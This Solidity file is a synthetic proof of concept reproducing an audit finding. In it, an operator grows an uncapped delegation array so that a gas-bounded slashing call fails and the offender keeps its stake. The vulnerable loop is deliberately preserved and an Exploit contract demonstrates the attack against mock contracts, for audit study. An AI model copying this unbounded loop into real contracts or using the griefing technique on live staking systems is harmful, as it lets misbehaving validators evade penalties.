// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Ethos — Denial of Slashing (OtterSec, finding 47343)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    verifyDoubleSigning walks delegatedValidators. updateDelegation pushes
    another entry at constant cost, so the operator grows the array until a
    slash cannot finish inside its gas budget. The inner call reverts with
    empty return data and the offender keeps N stake. A one-entry delegation
    under the same budget is slashed for N. No warp. Vulnerable loop
    preserved verbatim (@> VULN). */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory tokenName, string memory tokenSymbol) {
        name = tokenName;
        symbol = tokenSymbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract ServiceManager {
    struct Delegation {
        string validatorPubkey;
        uint256 endTimestamp;
        uint96 stake;
    }

    struct DoubleSigningEvidence {
        string validatorPubkey;
    }

    // A slash that cannot finish inside this budget reverts. One short entry fits.
    uint256 public constant SLASH_GAS = 130000;
    uint96 public constant STAKE_N = uint96(1000 ether);

    MockToken public stakeToken;
    address public operator;
    address public offender;
    address public treasury;
    uint256 public maxLen;
    uint256 public slashedAmount;
    Delegation[] public delegatedValidators;

    constructor(address token, address operator_, address offender_, address treasury_, uint256 maxLen_) {
        stakeToken = MockToken(token);
        operator = operator_;
        offender = offender_;
        treasury = treasury_;
        maxLen = maxLen_;
    }

    function delegatedCount() external view returns (uint256) {
        return delegatedValidators.length;
    }

    function updateDelegation(string calldata validatorPubkey) external {
        if (maxLen != 0) {
            require(delegatedValidators.length < maxLen, "length cap");
        }
        delegatedValidators.push(
            Delegation({validatorPubkey: validatorPubkey, endTimestamp: type(uint256).max, stake: STAKE_N})
        );
    }

    function compareStrings(string memory a, string memory b) internal pure returns (bool) {
        bytes memory left = bytes(a);
        bytes memory right = bytes(b);
        if (left.length != right.length) return false;
        for (uint256 i = 0; i < left.length; i++) {
            if (left[i] != right[i]) return false;
        }
        return true;
    }

    function isDelegationSlashable(uint256 endTimestamp) internal pure returns (bool) {
        return endTimestamp >= 1;
    }

    function maxUint96(uint256 a, uint96 b) internal pure returns (uint256) {
        return a > uint256(b) ? a : uint256(b);
    }

    // EthosAVS ServiceManager.verifyDoubleSigning — loop quoted by the report.
    function verifyDoubleSigning(address operator_, DoubleSigningEvidence memory e) external {
        require(operator_ == operator, "operator");
        uint256 stake = 0;
        bool timestampValid = false;
        // @> VULN: the slash scans every delegatedValidators entry, and updateDelegation can grow that array without a cap
        for (uint256 i = 0; i < delegatedValidators.length; i++) {
            if (
                compareStrings(delegatedValidators[i].validatorPubkey, e.validatorPubkey) &&
                isDelegationSlashable(delegatedValidators[i].endTimestamp)
            ) {
                timestampValid = true;
                stake = maxUint96(stake, delegatedValidators[i].stake);
            }
        }
        // FIX: cap delegatedValidators (the report suggests a bound such as 100) so this loop finishes inside a block
        require(timestampValid, "no slashable delegation");
        slashedAmount = stake;
        stakeToken.transferFrom(offender, treasury, stake);
    }

    function attemptSlash(string calldata pubkey) external returns (bool ok, bytes memory ret) {
        DoubleSigningEvidence memory e = DoubleSigningEvidence({validatorPubkey: pubkey});
        (ok, ret) = address(this).call{gas: SLASH_GAS}(
            abi.encodeWithSelector(this.verifyDoubleSigning.selector, operator, e)
        );
    }
}

contract Exploit {
    address public constant OFFENDER = 0x0000000000000000000000000000000000000ff1;
    address public constant TREASURY = 0x0000000000000000000000000000000000000eE1;
    address public constant OPERATOR = 0x0000000000000000000000000000000000000a11;
    uint256 public constant N = 1000 ether;
    uint256 public griefN;

    MockToken public stakeToken;
    ServiceManager public mgr;
    bool public slashOk;
    uint256 public revertBytes;
    uint256 public kept;
    uint256 public paidToTreasury;
    uint256 public entries;

    constructor() {
        stakeToken = new MockToken("Stake", "STAKE");
        mgr = new ServiceManager(address(stakeToken), OPERATOR, OFFENDER, TREASURY, 0);
        griefN = 6;
    }

    function makeKey() internal view returns (string memory) {
        bytes memory body = new bytes(320);
        uint256 j = 0;
        while (j < 319) {
            body[j] = bytes1(uint8(65));
            j += 1;
        }
        body[319] = bytes1(uint8(32 + (gasleft() % 90)));
        return string(body);
    }

    function run() external {
        uint256 i = 0;
        string memory lastPubkey;
        while (i < griefN) {
            lastPubkey = makeKey();
            mgr.updateDelegation(lastPubkey);
            i += 1;
        }
        entries = mgr.delegatedCount();
        stakeToken.mint(OFFENDER, N);
        (bool ok, bytes memory ret) = mgr.attemptSlash(lastPubkey);
        slashOk = ok;
        revertBytes = ret.length;
        kept = stakeToken.balanceOf(OFFENDER);
        paidToTreasury = stakeToken.balanceOf(TREASURY);
        require(entries == griefN, "array was not grown");
        require(slashOk == false, "slash did not revert");
        require(revertBytes == 0, "slash reverted with a reason, not out of gas");
        require(kept == N, "offender did not keep N");
        require(paidToTreasury == 0, "treasury was paid");
    }
}
